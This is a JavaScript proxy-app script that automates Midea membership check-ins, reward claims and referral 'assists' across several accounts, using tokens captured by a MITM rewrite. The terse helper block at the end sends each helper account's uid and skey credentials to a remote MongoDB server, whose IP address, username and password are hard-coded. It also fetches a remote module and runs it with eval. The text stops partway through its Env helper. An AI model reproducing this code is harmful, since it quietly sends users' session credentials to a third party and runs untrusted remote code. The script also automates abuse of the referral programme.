/*
------------------------------------------
@Author: 原作者Sliverkiss
@Date: 2024.10.20
@Description:美的会员 自动续期，20号会员日积分兑换半价
------------------------------------------
new Env("美的-日常任务");
cron 8 8,14 * * *  midea.js

@Description:
脚本兼容：Surge、QuantumultX、Loon、Shadowrocket，不支持青龙

2024.05.21 更新会员日助力活动

重写：小程序-早起打卡页面

[rewrite_local]
^https^https:\/\/(mcsp|cmms)\.midea\.com\/.*\/get(Pro)?MemberInfo.*  url script-response-body https://raw.githubusercontent.com/Maoshijin/wenjian/refs/heads/main/mideaV2.js

https:\/\/m\.midea\.cn\/next\/userinfo\/(getuserinfo|weapplogin) url script-response-body https://raw.githubusercontent.com/Maoshijin/wenjian/refs/heads/main/mideaV2.js

[MITM]
hostname = mcsp.midea.com, m.midea.cn, cmms.midea.com

⚠️【免责声明】
------------------------------------------
1、此脚本仅用于学习研究，不保证其合法性、准确性、有效性，请根据情况自行判断，本人对此不承担任何保证责任。
2、由于此脚本仅用于学习研究，您必须在下载后 24 小时内将所有内容从您的计算机或手机或任何存储设备中完全删除，若违反规定引起任何事件本人对此均不负责。
3、请勿将此脚本用于任何商业或非法目的，若违反规定请自行对此负责。
4、此脚本涉及应用与本人无关，本人对因此引起的任何隐私泄漏或其他后果不承担任何责任。
5、本人对任何脚本引发的问题概不负责，包括但不限于由脚本错误引起的任何损失和损害。
6、如果任何单位或个人认为此脚本可能涉嫌侵犯其权利，应及时通知并提供身份证明，所有权证明，我们将在收到认证文件确认后删除此脚本。
7、所有直接或间接使用、查看此脚本的人均应该仔细阅读此声明。本人保留随时更改或补充此声明的权利。一旦您使用或复制了此脚本，即视为您已接受此免责声明。
*/
const $ = new Env("美的会员");
//notify
const notify = $.isNode() ? require('./sendNotify') : '';
const ckName = "midea_data";
const userCookie = $.toObj($.isNode() ? process.env[ckName] : $.getdata(ckName)) || [];
//用户多账号配置
$.userIdx = 0, $.userList = [], $.notifyMsg = [];
//成功个数
$.succCount = 0;
//debug
$.is_debug = ($.isNode() ? process.env.IS_DEDUG : $.getdata('is_debug')) || 'false';
$.award = ($.isNode() ? process.env["midea_award"] : $.getdata('midea_award')) || 'false';
$.helpDay = ($.isNode() ? process.env["midea_helpDay"] : $.getdata('midea_helpDay')) || 'false';
$.initData = []
//------------------------------------------
async function main() {
    for (let user of $.userList) {
        //$.notifyMsg = [], $.title = "";
        try {
            await user.Login();
            //检查token是否过期
            if (user.ckStatus) {
                const { vipPoint: pointF } = await user.getUserInfo();
                await user.getRegisterData();
                //默认助力第一个账号
                if (isVipDay() && user?.index == 1) {
                    //设置助力用户
                    await setHelpUser(user);
                    let { actvId, channelId } = await user?.getChannelId();
                    $.actvId = actvId;
                    $.channelId = channelId;
                    $.info(`[actvId]:${actvId}`)
                    $.info(`[channelId]:${channelId}`)

                } else if ($.helpId) {
                    //注册助力用户
                    await user.getFissionData();
                    //助力
                    await user.assistHelp();
                }
                //await user.checkIn();
                await user.signin();
                if ($.award != "false") {
                    let awardList = await user.getRewardList() ?? [];
                    for (item of awardList) {
                        await user.getReward(item);
                    }
                }
                //await user.taskClock();
                //await user.applyClock();
                const { vipPoint: pointE } = await user.getUserInfo();
                $.notifyMsg.push(`[${user.userName}] 积分:${pointF}${pointE >= pointF ? "+" : ""}${pointE - 0 - pointF}`);
                $.succCount++;
            } else {
                DoubleLog(`[${user?.userName}] 积分: 查询失败，用户需要去登录`)
            }
        } catch (e) {
            throw e
        }
    }
    $.title = `共${$.userList.length}个账号,成功${$.succCount}个,失败${$.userList.length - 0 - $.succCount}个`
    //notify
    await sendMsg($.notifyMsg.join("\n"), { $media: $.avatar });
}

//用户
class UserInfo {
    constructor(user) {
        //默认属性
        this.index = ++$.userIdx;
        this.token = "" || user.token || user;
        this.uid = "" || user.uid;
        this.skey = "" || user.skey;
        this.userId = user.uid;
        this.userName = user.userName || user.uid || user.index;
        this.avatar = user.avatar;
        this.ckStatus = true;
        //请求封装
        this.baseUrl = `https://mcsp.midea.com`;
        this.headers = {
            'Accept-Encoding': `gzip,compress,br,deflate`,
            'content-type': `application/json`,
            'Cookie': `uid=${this.uid};skey=${this.skey};sukey=${this.skey};ucAccessToken=`,
            'User-Agent': `Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/4G Language/zh_CN`,
        };
        this.getRandomTime = () => randomInt(1e3, 3e3);
        this.fetch = async (o) => {
            try {
                if (typeof o === 'string') o = { url: o };
                if ((!o?.url) || o?.url?.startsWith("/") || o?.url?.startsWith(":")) o.url = this.baseUrl + (o.url || '')
                const res = await Request({ ...o, headers: o.headers || this.headers, url: o.url || this.baseUrl })
                debug(res, o?.url?.replace(/\/+$/, '').substring(o?.url?.lastIndexOf('/') + 1));
                //if (res?.msg?.match(/登录/)) throw new Error(res?.msg);
                return res;
            } catch (e) {
                this.ckStatus = false;
                $.error(`[${this.userName || this.index}]请求发起失败!${e}`);
            }
        }
    }
// 登录
    async Login() {
        try {
            // 如果我们已经抓到了新版的 token，直接赋值，跳过旧版的刷新逻辑
            if (this.token) {
                this.headers['ucAccessToken'] = this.token;
                this.headers['Cookie'] = `ucAccessToken=${this.token}`;
                return;
            }

            // 下面保留原逻辑兜底（以防万一）
            const opts = {
                url: "/api/cms_bff/mcsp-uc-mvip-bff/app/login/refreshUcToken.do",
                type: "post",
                dataType: "json",
                body: {
                    uid: this.uid,
                    suKey: this.skey,
                    platformType: "WX_MVIP_MINI"
                }
            }
            let res = await this.fetch(opts);
            if (!res?.data?.ucAccessToken) throw new Error(res?.msg);
            this.headers['Cookie'] = `ucAccessToken=${res?.data?.ucAccessToken}`;
            this.headers['ucAccessToken'] = res?.data?.ucAccessToken
        } catch (e) {
            this.ckStatus = false;
            $.error(`[${this.userName || this.userId}] 错误！${e}`);
        }
    }
    //签到
    async signin() {
        try {
            const opts = {
                url: "https://mvip.midea.cn/my/score/create_daily_score",
            }
            let res = await this.fetch(opts);
            try {
                res = $.toObj(res?.replace(/\t|\n|\v|\r|\f/g, ''))
            } catch (e) {
                res = { errcode: 0 }
            }
            let codeInfo = { "0": "签到成功", "314": "今日已签到" }
            $.info(`[${this.userName}] 签到: ${codeInfo[res?.errcode] || "签到失败，请检查ck是否过期"}`);
        } catch (e) {
            this.ckStatus = false;
            $.error(`[${this.userName || this.userId}] 错误！${e}`);
        }
    }
    //查询用户信息
    async getUserInfo() {
        try {
            // 1. 保留旧接口获取基础信息
            const optsInfo = {
                url: "/api/cms_bff/mcsp-uc-mvip-bff/member/getProMemberInfo.do",
                type: "post",
                headers: {
                    ...this.headers,
                    "userKey": this.token,
                    "apiKey": "b6db9d5cf2d449538d3a0dd5d77b2e35",
                    "appId": "ee07f27990db48109efcccd322d3a873"
                }
            }
            let resInfo = await this.fetch(optsInfo);
            this.userName = phone_num(resInfo?.data?.mobile);
            this.c4aUid = resInfo?.data?.c4aUid;
            this.phone = resInfo?.data?.mobile;
            
            // 2. 调用新接口获取真实积分
            const optsPoints = {
                url: "/api/mcsp_cms/mcsp-cmshop-bff-app/user/getMemberInfo",
                type: "post",
                headers: {
                    ...this.headers,
                    "userKey": this.token,
                    "apiKey": "b6db9d5cf2d449538d3a0dd5d77b2e35",
                    "appId": "ee07f27990db48109efcccd322d3a873",
                    "content-type": "application/json"
                },
                body: {
                    "headParams": {
                        "userKey": this.token
                    },
                    "restParams": {
                        "brand": 1
                    }
                }
            };
            let resPoints = await this.fetch(optsPoints);
            
            // 【透视眼代码】打印整个返回结果
            console.log(`\n=========寻找564的藏身之处=========`);
            console.log(JSON.stringify(resPoints));
            console.log(`====================================\n`);

            // 暂时先让它跑通，等看完日志我们再填写真实的字段名
            resInfo.data.vipPoint = resPoints?.data?.score || resPoints?.data?.point || resPoints?.data?.totalScore || resInfo?.data?.vipPoint || 0;

            return resInfo?.data;
        } catch (e) {
            this.ckStatus = false;
            $.error(`[${this.userName || this.userId}] 错误！${e}`);
        }
    }


    //报名早起打卡
    async applyClock() {
        try {
            const opts = {
                url: "https://mvip.midea.cn/next/early_clock_r/applyforearlyclock",
                type: "post",
            }
            let res = await this.fetch(opts);
            $.info(`[${this.userName}] 报名:${res?.errmsg || $.toStr(res)}`);
        } catch (e) {
            this.ckStatus = false;
            $.error(`[${this.userName || this.userId}] 错误！${e}`);
        }
    }
    //打卡
    async taskClock() {
        try {
            const opts = {
                url: "https://mvip.midea.cn/next/early_clock_r/clockforearlyclock",
                type: "post",
            }
            let res = await this.fetch(opts);
            $.info(`[${this.userName}] 打卡:${res?.errmsg || $.toStr(res)}`);
        } catch (e) {
            this.ckStatus = false;
            $.error(`[${this.userName || this.userId}] 错误！${e}`);
        }
    }
    //获取注册时信息
    async getRegisterData() {
        try {
            const opts = {
                url: "https://mvip.midea.cn/mscp_mscp/api/cms_api/activity-center-im-service/im-svr/common/login/register",
                type: "post",
                dataType: "json",
                headers: {
                    'Sec-Fetch-Dest': `empty`,
                    'Connection': `keep-alive`,
                    'Accept-Encoding': `gzip, deflate, br`,
                    'Content-Type': `application/json`,
                    'appId': `QLZZ9Fr7w2to`,
                    'Sec-Fetch-Site': `same-origin`,
                    'Origin': `https://mvip.midea.cn`,
                    'User-Agent': `Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/111.0.5563.101 Mobile/15E148 Safari/604.1`,
                    'Sec-Fetch-Mode': `cors`,
                    'apiKey': `3660663068894a0d9fea574c2673f3c0`,
                    'Host': `mvip.midea.cn`,
                    'Referer': `https://mvip.midea.cn/mscp_weixin/apps/h5-pro-wx-interaction-marketing/`,
                    'Accept-Language': `zh-CN,zh-Hans;q=0.9`,
                },
                body: {
                    "headParams": {
                        "timeZone": "",
                        "tenantCode": "",
                        "userCode": "",
                        "language": "CN",
                        "originSystem": "MCSP",
                        "transactionId": "",
                        "userKey": "TEST_"
                    },
                    "restParams": {
                        "openId": "",
                        "uid": this.c4aUid,
                        "phone": this.phone,
                        "unionId": "",
                        "actvId": "401671388248692763",
                        "imUserId": "",
                        "appCode": "MDHY_GZH",
                        "rootCode": "MDHY"
                    },
                    "pagination": null
                }
            }
            let res = await this.fetch(opts);
            const { openId, imUserId, unionId } = res?.data ?? {}
            if (!(openId && imUserId && unionId)) throw new Error("获取活动页面信息失败");
            this.openId = openId;
            this.imUserId = imUserId;
            this.unionId = unionId;
        } catch (e) {
            this.ckStatus = false;
            $.error(`[${this.userName || this.userId}] 错误！${e}`);
        }
    }
    //签到
    async checkIn() {
        try {
            const opts = {
                url: "https://mvip.midea.cn/mscp_mscp/api/cms_api/activity-center-im-service/im-svr/im/game/page/sign",
                type: "post",
                dataType: "json",
                headers: {
                    'Content-Type': `application/json`,
                    'appId': `QLZZ9Fr7w2to`,
                    'vcode': `4739355c7078d4e0f331321790723a72`,
                    'User-Agent': `Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN miniProgram/wx33856a6b31431c6e`,
                    'apiKey': `3660663068894a0d9fea574c2673f3c0`,
                },
                body: {
                    "headParams": {
                        "language": "CN",
                        "originSystem": "MCSP",
                        "timeZone": "",
                        "userCode": "",
                        "tenantCode": "",
                        "userKey": "TEST_",
                        "transactionId": ""
                    },
                    "pagination": null,
                    "restParams": {
                        "gameId": 22,
                        "actvId": "401671388248692763",
                        "imUserId": this.imUserId,
                        "uid": this.c4aUid,
                        "openId": this.openId,
                        "unionId": this.unionId,
                        "appCode": "MDHY_GZH",
                        "rootCode": "MDHY"
                    }

                }
            }
            let res = await this.fetch(opts);
            $.info(`[${this.userName}][活动日] 签到: ${res?.data?.dailyRewardInfo?.prizeName || res?.msg}`);
            return res?.data?.dailyRewardInfo
        } catch (e) {
            this.ckStatus = false;
            $.error(`[${this.userName || this.userId}] 错误！${e}`);
        }
    }
    //活动-获取领取奖励列表
    async getRewardList() {
        try {
            const opts = {
                url: "https://mvip.midea.cn/mscp_mscp/api/cms_api/activity-center-im-service/im-svr/cmimp/activity/myPrize",
                type: "post",
                dataType: "json",
                headers: {
                    "Host": "mvip.midea.cn",
                    "appId": "QLZZ9Fr7w2to",
                    "intercept": 1,
                    "vcode": "12db6650de9b548f19a44517fe6521eb",
                    "apiKey": "3660663068894a0d9fea574c2673f3c0",
                    "Origin": "https://mvip.midea.cn",
                    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN miniProgram/wx03925a39ca94b161",
                    "Referer": "https://mvip.midea.cn/mscp_weixin/apps/h5-pro-wx-interaction-marketing/"
                },
                body: {
                    "headParams": {
                        "timeZone": "",
                        "tenantCode": "",
                        "userCode": "",
                        "language": "CN",
                        "originSystem": "MCSP",
                        "transactionId": "",
                        "userKey": "TEST_"
                    },
                    "restParams": {
                        "actvId": "401671388248692763",
                        "userId": this.imUserId,
                        "imUserId": this.imUserId,
                        "uid": this.c4aUid,
                        "openId": this.openId,
                        "unionId": this.unionId,
                        "rootCode": "MDHY"
                    },
                    "pagination": null
                }


            }
            let res = await this.fetch(opts);
            return res?.data?.filter(e => e?.receiveStatus == 0);
        } catch (e) {
            this.ckStatus = false;
            $.error(`[${this.userName || this.userId}] 错误！${e}`);
        }
    }
    //活动-领取奖励
    async getReward(data) {
        try {
            const opts = {
                url: "https://mvip.midea.cn/mscp_mscp/api/cms_api/activity-center-im-service/im-svr/im/game/page/takeprize",
                type: "post",
                dataType: "json",
                headers: {
                    "Host": "mvip.midea.cn",
                    "appId": "QLZZ9Fr7w2to",
                    "intercept": 1,
                    "vcode": "97af4bf28fa013092acf684cc89a1be8",
                    "apiKey": "3660663068894a0d9fea574c2673f3c0",
                    "Origin": "https://mvip.midea.cn",
                    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN miniProgram/wx03925a39ca94b161",
                    "Referer": "https://mvip.midea.cn/mscp_weixin/apps/h5-pro-wx-interaction-marketing/"
                },
                body: {
                    "headParams": {
                        "timeZone": "",
                        "tenantCode": "",
                        "userCode": "",
                        "language": "CN",
                        "originSystem": "MCSP",
                        "transactionId": "",
                        "userKey": "TEST_"
                    },
                    "restParams": {
                        "gameId": 22,
                        "actvId": "401671388248692763",
                        "imUserId": this.imUserId,
                        "uid": this.c4aUid,
                        "openId": this.openId,
                        "unionId": this.unionId,
                        "prizedId": data?.prizeId,
                        "awardSettingId": data?.awardId,
                        "appCode": "MDHY_GZH",
                        "awardRecordId": data?.awardRecordId,
                        "rootCode": "MDHY"
                    },
                    "pagination": null
                }

            }
            let res = await this.fetch(opts);
            $.info(`[${this.userName}][活动日] 领取[${data?.prizeName}]奖励: ${res?.msg}`);
            return res?.data?.dailyRewardInfo
        } catch (e) {
            this.ckStatus = false;
            $.error(`[${this.userName || this.userId}] 错误！${e}`);
        }
    }
    //查询用户信息
    async getChannelId() {
        try {
            const opts = {
                url: "https://mcsp-api.midea.com/api/cms_api/activity-center-im-service/im-svr/cmimp/user/login/getLongUrlByToken?apikey=3660663068894a0d9fea574c2673f3c0",
                type: "post",
                dataType: "json",
                headers: {
                    "Host": "mcsp-api.midea.com",
                    "appId": "ee07f27990db48109efcccd322d3a873",
                    "Accept": "application/json, text/plain, */*",
                    "Accept-Language": "zh-CN,zh-Hans;q=0.9",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Content-Type": "application/json",
                    "apiKey": "b6db9d5cf2d449538d3a0dd5d77b2e35",
                    "Origin": "https://mvip.midea.cn",
                    "Content-Length": "480",
                    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN miniProgram/wx03925a39ca94b161",
                    "Referer": "https://mvip.midea.cn/mscp_weixin/apps/h5-pro-wx-interaction-marketing/",
                    "Connection": "keep-alive",
                    "ucAccessToken": this.headers["ucAccessToken"]
                },
                body: {
                    "restParams": {
                        "openId": "",
                        "uid": "",
                        "mobile": "",
                        "unionId": "",
                        "ucToken": "",
                        "appCode": "DJ_WX",
                        "rootCode": "DJ",
                        "shortUrl": "https:\/\/d.midea.com\/d\/2gefUvghgPw"
                    },
                }
            }
            let res = await this.fetch(opts);
            return getQueries(res?.data);
        } catch (e) {
            this.ckStatus = false;
            $.error(`[${this.userName || this.userId}] 错误！${e}`);
        }
    }
    //报名参加助力
    async getFissionData() {
        try {
            const opts = {
                url: "https://mvip.midea.cn/mscp_mscp/api/cms_api/activity-center-im-service/im-svr/im/points/fission/getFissionData",
                type: "post",
                dataType: "json",
                headers: {
                    "Host": "mvip.midea.cn",
                    "appId": "QLZZ9Fr7w2to",
                    "Accept": "application/json, text/plain, */*",
                    "Accept-Language": "zh-CN,zh-Hans;q=0.9",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Content-Type": "application/json",
                    "apiKey": "3660663068894a0d9fea574c2673f3c0",
                    "Origin": "https://mvip.midea.cn",
                    "Content-Length": "480",
                    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN miniProgram/wx03925a39ca94b161",
                    "Referer": "https://mvip.midea.cn/mscp_weixin/apps/h5-pro-wx-interaction-marketing/",
                    "Connection": "keep-alive",
                    "ucAccessToken": this.headers["ucAccessToken"]
                },
                body: { "headParams": { "language": "CN", "originSystem": "MCSP", "timeZone": "", "userCode": "", "tenantCode": "", "userKey": "TEST_", "transactionId": "" }, "pagination": null, "restParams": { "actvId": $.actvId, "uid": this.c4aUid, "channelId": $.channelId, "invitePeople": false, "inviterUid": $.helpId, "imUserId": this.imUserId, "openId": this.openId, "unionId": this.unionId } }
            }
            let res = await this.fetch(opts);
            //$.info(`[${this.userName}] 会员日助力: ${res?.msg}`);
        } catch (e) {
            this.ckStatus = false;
            $.error(`[${this.userName || this.userId}] 错误！${e}`);
        }
    }
    //助力
    async assistHelp() {
        try {
            const opts = {
                url: "https://mvip.midea.cn/mscp_mscp/api/cms_api/activity-center-im-service/im-svr/im/points/fission/assist",
                type: "post",
                dataType: "json",
                headers: {
                    "Host": "mvip.midea.cn",
                    "appId": "QLZZ9Fr7w2to",
                    "Accept": "application/json, text/plain, */*",
                    "Accept-Language": "zh-CN,zh-Hans;q=0.9",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Content-Type": "application/json",
                    "apiKey": "3660663068894a0d9fea574c2673f3c0",
                    "Origin": "https://mvip.midea.cn",
                    "Content-Length": "480",
                    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN miniProgram/wx03925a39ca94b161",
                    "Referer": "https://mvip.midea.cn/mscp_weixin/apps/h5-pro-wx-interaction-marketing/",
                    "Connection": "keep-alive",
                    "ucAccessToken": this.headers["ucAccessToken"]
                },
                body: {
                    "headParams": {
                        "timeZone": "",
                        "tenantCode": "",
                        "userCode": "",
                        "language": "CN",
                        "originSystem": "MCSP",
                        "transactionId": "",
                        "userKey": "TEST_"
                    },
                    "restParams": {
                        "actvId": $.actvId,
                        "helperUid": this.c4aUid,
                        "channelId": $.channelId,
                        "uid": this.c4aUid,
                        "inviterUid": $.helpId,
                        "invitePeople": false,
                        "imUserId": this.imUserId,
                        "openId": this.openId,
                        "unionId": this.unionId,
                    },
                    "pagination": null
                }
            }
            let res = await this.fetch(opts);
            $.info(`[${this.userName}][会员日] 助力: ${res?.msg}`);
        } catch (e) {
            this.ckStatus = false;
            $.error(`[${this.userName || this.userId}] 错误！${e}`);
        }
    }

}

//判断是否为会员日
function isVipDay() {
    const today = new Date();
    const day = today.getDate();
    return $.helpDay != "false" ? day == 21 : day == 20;
}

function phone_num(phone_num) { if (phone_num.length == 11) { let data = phone_num.replace(/(\d{3})\d{4}(\d{4})/, "$1****$2"); return data; } else { return phone_num; } }

//远程通知
async function getNotice() {
    const urls = [
        "https://fastly.jsdelivr.net/gh/Sliverkiss/GoodNight@main/notice.json",
        "https://fastly.jsdelivr.net/gh/Sliverkiss/GoodNight@main/tip.json"
    ];

    try {
        const responses = await Promise.all(urls.map(url => Request(url)));
        responses.map(result => $.log(result?.notice || "获取通知失败"));
        if (responses[0]?.notice) return true;
    } catch (error) {
        console.log(`❌获取通知时发生错误：${error}`);
    }
}

//匹配cookie取值
const extractValues = (input, keys) => {
    if (!input) return {};
    const regex = new RegExp(keys.map(key => `${key}=([^;]+)`).join(";.*?"));
    const match = input?.match(regex);
    return match ? keys.reduce((result, key, index) => ({ ...result, [key]: match[index + 1] }), {}) : null;
};

// 获取Cookie (新版 Token 逻辑)
async function getCookie() {
    try {
        if ($request && $request.method === 'OPTIONS') return;
        const Headers = ObjectKeys2LowerCase($request.headers);
        
        // 现在官方全靠 ucAccessToken 鉴权了，我们直接抓它
        const token = Headers["ucaccesstoken"] || Headers["ucAccessToken"];
        if (!token) return;

        // 构造新的数据结构，伪造一个 userId 防止原脚本报错
        const newData = {
            "userId": token.substring(0, 8), 
            "uid": "",
            "skey": "",
            "userName": "美的用户",
            "token": token
        }

        const index = userCookie.findIndex(e => e.token == newData.token);
        userCookie[index] ? userCookie[index] = newData : userCookie.push(newData);

        $.setjson(userCookie, ckName);
        $.msg($.name, `🎉获取新版 Token 成功!`, ``);
    } catch (e) {
        throw e;
    }
}


function getQueries(t) { const [, e] = t.split("?"); return e ? e.split("&").reduce((t, e) => { var [r, e] = e.split("="); return t[r] = e, t }, {}) : {} };

//处理node
function getEnvByNode() {
    let ckList = ($.isNode() ? process.env[ckName] : $.getdata(ckName)) || "";
    // 判断ckList是否是数组
    if (!Array.isArray(ckList)) {
        ckList = ckList.split("&");  // 将字符串分割为数组
        ckList = ckList.map(e => {
            const [phone, password] = e.split('#');
            let newData = {
                "phone": phone,
                "password": password,
            };
            return newData;
        });
    }

    return ckList;
}

//主程序执行入口
!(async () => {
    try {
        if (typeof $request != "undefined") {
            await getCookie();
        } else {
            //if (!(await getNotice())) throw new Error("网络状况不好，请重新尝试~")
            await checkEnv();
            await main();
            await loadingData();
        }
    } catch (e) {
        throw e;
    }
})()
    .catch((e) => { $.logErr(e), $.msg($.name, `⛔️ script run error!`, e.message || e) })
    .finally(async () => {
        $.done({});
    });

/** ---------------------------------固定不动区域----------------------------------------- */
//prettier-ignore
async function setHelpUser(e) { $.helpId = e.c4aUid, $.info(`[${e.userName}] 设置为当前助力账号`); let { documents: i } = await getHelpListData(); i = i?.map((e => e.uid)), i?.includes(e?.uid) || $.initData.push({ type: "midea", uid: e?.uid, skey: e?.skey }) }
async function getHelpListData() { const a = MongoDB("http://129.150.48.51:10998", "loh", "sliverkiss777", "telegram", "midea_db"); let res = await a.find({ "type": "midea" }); return res }
async function sendMsg(a, e) { a && ($.isNode() ? await notify.sendNotify($.name, a) : $.msg($.name, $.title || "", a, e)) }
function DoubleLog(o) { o && ($.log(`${o}`), $.notifyMsg.push(`${o}`)) };
async function loadingData() { const a = MongoDB("http://129.150.48.51:10998", "loh", "sliverkiss777", "telegram", "midea_db"); await a.insertMany($.initData) }
async function checkEnv() { try { if (!userCookie?.length) throw new Error("no available accounts found"); $.log(`\n[INFO] 检测到 ${userCookie?.length ?? 0} 个账号\n`), $.userList.push(...userCookie.map((o => new UserInfo(o))).filter(Boolean)) } catch (o) { throw o } }
function debug(g, e = "debug") { "true" === $.is_debug && ($.log(`\n-----------${e}------------\n`), $.log("string" == typeof g ? g : $.toStr(g) || `debug error => t=${g}`), $.log(`\n-----------${e}------------\n`)) }
//From sliverkiss's MongoDB.js
function MongoDB(t, n, o, e, s) { return new class { constructor(t, n, o, e, s) { this.BASE_URL = t, this.username = n, this.password = o, this.database = e, this.collection = s } async commonPost(t) { const { url: n, headers: o, body: e, method: s = "post" } = t, a = { url: `${this.BASE_URL}${n}`, headers: { "Content-Type": "application/json", Accept: "application/json", ...o }, body: $.toStr({ USERNAME: this.username, PASSWORD: this.password, DATABASE: this.database, COLLECTION: this.collection, ...e }) }; return new Promise((t => { $[s](a, ((n, o, e) => { let s = $.toObj(e) || e; t(s) })) })) } async findOne(t) { const n = { url: "/findOne", body: { filter: t } }; return await this.commonPost(n) } async find(t) { const n = { url: "/find", body: { filter: t } }; return await this.commonPost(n) } async insertOne(t) { const n = { url: "/insertOne", body: { document: t } }; return await this.commonPost(n) } async insertMany(t) { const n = { url: "/insertMany", body: { documents: t } }; return await this.commonPost(n) } async updateOne(t, n) { const o = { url: "/updateOne", body: { filter: t, update: n } }; return await this.commonPost(o) } async updateMany(t, n) { const o = { url: "/updateMany", body: { filter: t, update: n } }; return await this.commonPost(o) } async deleteOne(t) { const n = { url: "/deleteOne", body: { filter: t } }; return await this.commonPost(n) } async deleteMany(t) { const n = { url: "/deleteMany", body: { filter: t } }; return await this.commonPost(n) } }(t, n, o, e, s) }
//From sliverkiss's refreshQingLong
async function refreshQingLong(userCookie, ckName) { try { if (!$.isNode()) return; let e = process.env.ql_port || "", n = process.env.ql_client_id || "", t = process.env.ql_client_secret || "", o = await loadQingLong({ host: `http://127.0.0.1:${e}`, clientId: n, secret: t }); await o.checkLogin(), await o.getEnvs(); let [i] = o.selectEnvByName(ckName); try { await o.updateEnv({ value: $.toStr(userCookie), name: ckName, remarks: `${i?.remarks}`, id: `${i?.id}` }) } catch (e) { } } catch (e) { } async function loadQingLong(QL) { let code = $.getdata("qinglong_code") || ""; return code && Object.keys(code).length ? ($.info("[QingLong] 模块加载成功,请继续"), eval(code), new QingLong(QL.host, QL.clientId, QL.secret)) : ($.info("[QingLong] 开始安装模块..."), new Promise((async resolve => { $.getScript("https://fastly.jsdelivr.net/gh/Sliverkiss/QuantumultX@main/Utils/QingLong.min.js").then((fn => { $.setdata(fn, "qinglong_code"), eval(fn); const ql = new QingLong(QL.host, QL.clientId, QL.secret); $.info("[QingLong] 模块加载成功,请继续"), resolve(ql) })) }))) } }
//From xream's ObjectKeys2LowerCase
function ObjectKeys2LowerCase(obj) { return !obj ? {} : Object.fromEntries(Object.entries(obj).map(([k, v]) => [k.toLowerCase(), v])) };
//From sliverkiss's Request
async function Request(t) { "string" == typeof t && (t = { url: t }); try { if (!t?.url) throw new Error("[URL][ERROR] 缺少 url 参数"); let { url: o, type: e, headers: r = {}, body: s, params: a, dataType: n = "form", resultType: u = "data" } = t; const p = e ? e?.toLowerCase() : "body" in t ? "post" : "get", c = o.concat("post" === p ? "?" + $.queryStr(a) : ""), i = t.timeout ? $.isSurge() ? t.timeout / 1e3 : t.timeout : 1e4; "json" === n && (r["Content-Type"] = "application/json;charset=UTF-8"); const y = "string" == typeof s ? s : (s && "form" == n ? $.queryStr(s) : $.toStr(s)), l = { ...t, ...t?.opts ? t.opts : {}, url: c, headers: r, ..."post" === p && { body: y }, ..."get" === p && a && { params: a }, timeout: i }, m = $.http[p.toLowerCase()](l).then((t => "data" == u ? $.toObj(t.body) || t.body : $.toObj(t) || t)).catch((t => $.log(`[${p.toUpperCase()}][ERROR] ${t}\n`))); return Promise.race([new Promise(((t, o) => setTimeout((() => o("当前请求已超时")), i))), m]) } catch (t) { console.log(`[${p.toUpperCase()}][ERROR] ${t}\n`) } }
//From chavyleung's Env.js
function Env(t, e) { class s { constructor(t) { this.env = t } send(t, e = "GET") { t = "string" == typeof t ? { url: t } : t; let s = this.get; return "POST" === e && (s = this.post), new Promise(((e, i) => { s.call(this, t, ((t, s, o) => { t ? i(t) : e(s) })) })) } get(t) { return this.send.call(this.env, t) } post(t) { return this.send.call(this.env, t, "POST") } } return new class { constructor(t, e) { this.logLevels = { debug: 0, info: 1, warn: 2, error: 3 }, this.logLevelPrefixs = { debug: "[DEBUG] ", info: "[INFO] ", warn: "[WARN] ", error: "[ERROR] " }, this.logLevel = "info", this.name = t, this.http = new s(this), this.data = null, this.dataFile = "box.dat", this.logs = [], this.isMute = !1, this.isNeedRewrite = !1, this.logSeparator = "\n", this.encoding = "utf-8", this.startTime = (new Date).getTime(), Object.assign(this, e), this.log("", `🔔${this.name}, 开始!`) } getEnv() { return "undefined" != typeof $environment && $environment["surge-version"] ? "Surge" : "undefined" != typeof $environment && $environment["stash-version"] ? "Stash" : "undefined" != typeof module && module.exports ? "Node.js" : "undefined" != typeof $task ? "Quantumult X" : "undefined" != typeof $loon ? "Loon" : "undefined" != typeof $rocket ? "Shadowrocket" : void 0 } isNode() { return "Node.js" === this.getEnv() } isQuanX() { return "Quantumult X" === this.getEnv() } isSurge() { return "Surge" === this.getEnv() } isLoon() { return "Loon" === this.getEnv() } isShadowrocket() { return "Shadowrocket" === this.getEnv() } isStash() { return "Stash" === this.getEnv() } toObj(t, e = null) { try { return JSON.parse(t) } catch { return e } } toStr(t, e = null, ...s) { try { return JSON.stringify(t, ...s) } catch { return e } } getjson(t, e) { let s = e; if (this.getdata(t)) try { s = JSON.parse(this.getdata(t)) } catch { } return s } setjson(t, e) { try { return this.setdata(JSON.stringify(t), e) } catch { return !1 } } getScript(t) { return new Promise((e => { this.get({ url: t }, ((t, s, i) => e(i))) })) } 